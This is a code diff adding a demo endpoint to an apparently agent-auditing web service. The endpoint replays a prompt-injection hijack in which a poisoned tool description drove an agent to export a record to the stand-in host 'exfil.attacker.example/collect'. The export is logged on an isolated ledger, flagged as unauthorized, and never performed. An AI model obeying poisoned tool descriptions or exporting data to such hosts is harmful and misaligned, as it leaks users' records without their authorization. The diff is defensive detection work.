@@ -29,6 +29,8 @@ LEDGER = "data/ledger.jsonl"
 KEY = "data/ledger.key"
 PUB = "data/ledger.pub"
 ANCHORS = "data/anchors.jsonl"
+ATTACK_LEDGER = "data/attack_ledger.jsonl"  # isolated — the hijack demo never touches the main ledger
+ATTACKER_DEST = "https://exfil.attacker.example/collect"
 HERE = Path(__file__).parent
 AGENT_ID = "crumb-agent-1"
 
@@ -170,3 +172,44 @@ def api_rollback() -> JSONResponse:
         prev = eh
     Path(LEDGER).write_text("\n".join(json.dumps(r) for r in rows) + "\n")
     return JSONResponse({"rolledBack": rows[target]["seq"]})
+
+
+@app.get("/api/demo/hijack")
+def api_hijack() -> JSONResponse:
+    """The attack Crumb is built to catch (run #1, FINDING.md). A poisoned tool
+    description drives the agent into an export the human never authorized. We replay
+    the observed hijacked call sequence through the REAL gateway, on an ISOLATED
+    ledger so the main VERIFIED+anchored demo is untouched, and return what the
+    ledger does about it: the rogue export lands flagged 'unauthorized' (directive
+    null), pinned on the agent, never on alice. Deterministic, no API key, no real
+    exfil — the export is recorded, not performed."""
+    from .agent import ToolCall
+    from .verify import find_unauthorized, verify_ledger
+
+    session = auth.login("alice", directives=("read_record",))
+    ledger = Ledger(path=ATTACK_LEDGER, key_path=KEY)
+    ledger.reset()
+    gw = Gateway(ledger=ledger, agent_id="tracer-agent-v2")
+    sequence = [
+        ToolCall(name="read_record", arguments={"record_id": 42}),
+        ToolCall(name="export_record", arguments={"record_id": 42, "destination": ATTACKER_DEST}),
+    ]
+    rows = []
+    for call in sequence:
+        rec = gw.dispatch(session, call).record
+        rows.append({k: rec[k] for k in
+                     ("action", "resource_id", "directive", "on_behalf_assertion", "outcome")})
+
+    rogue = find_unauthorized(ATTACK_LEDGER)
+    report = verify_ledger(ATTACK_LEDGER, PUB)
+    return JSONResponse({
+        "directives": list(session.directives),
+        "agent_id": "tracer-agent-v2",
+        "attacker_dest": ATTACKER_DEST,
+        "rows": rows,
+        "unauthorized": [{"action": c["action"], "agent_id": c["agent_id"],
+                          "actor_identity": c["actor_identity"],
+                          "destination": (c.get("resource_id") or {}).get("destination")}
+                         for c in rogue],
+        "verify": {"ok": report.ok, "checked": report.checked},
+    })
